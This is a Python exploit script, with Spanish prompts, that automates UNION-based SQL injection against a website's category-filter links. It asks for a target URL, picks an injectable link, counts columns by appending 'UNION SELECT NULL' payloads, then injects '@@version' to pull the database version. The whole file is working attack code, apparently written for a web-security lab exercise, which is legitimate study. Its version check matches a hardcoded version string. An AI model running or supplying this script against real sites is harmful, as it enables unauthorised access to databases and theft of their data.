import requests
from bs4 import BeautifulSoup
import urllib3
import sys
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def determinar_numero_columnas(url, uri):
    i=1
    sql_payload = "'+UNION+SELECT+NULL"
    while True:
        print(f"Testeando el siguiente payload: {sql_payload}")
        peticion = requests.get(url+uri[1:]+sql_payload+"-- - ")
        if peticion.status_code  == 200:
            return i 
        sql_payload = sql_payload+",NULL"
        i+=1
    return False

def payload(n_columnas):
    array = ['NULL']*(n_columnas)
    array[0] = '@@version'
    return "'+UNION+SELECT+" + ','.join(map(str,array))

def atacar(url):
    peticion = peticion = requests.get(url)
    html = peticion.text
    soup = BeautifulSoup(html, 'html.parser')
    version = soup.find_all(string=re.compile('8.0.35-0ubuntu0.20.04.1'))
    print(f"La versión de la base de datos es: {version[len(version)-1]}")
    

def encontrar_links_ataque(url):
    r = requests.get(url, verify = False)
    soup = BeautifulSoup(r.text, 'html.parser')
    categorias = soup.find_all('a', class_='filter-category')
    print("\nSe han encontrado los siguientes links para realizar el ataque:\n")
    
    for i in range(len(categorias)):
        if i>0:
            print(f"{i}. {categorias[i].text} Enlace de ataque: {categorias[i]['href']}")
    
    print("\nIngrese el indice del enlace para realizar el ataque: ", end="")
    indice = int(input())
        
    return categorias[indice]['href']

def main():
    print("\nIngrese URL a atacar: ", end="")
    url = input()
    uri = encontrar_links_ataque(url)
    n_columnas = determinar_numero_columnas(url, uri)
    url_ataque = url + uri[1:] + payload(n_columnas) + "-- -"
    print(f"\nLa URL a atacar es:\n\n{url_ataque}\n")
    atacar(url_ataque)
        

if __name__ == "__main__":
    main()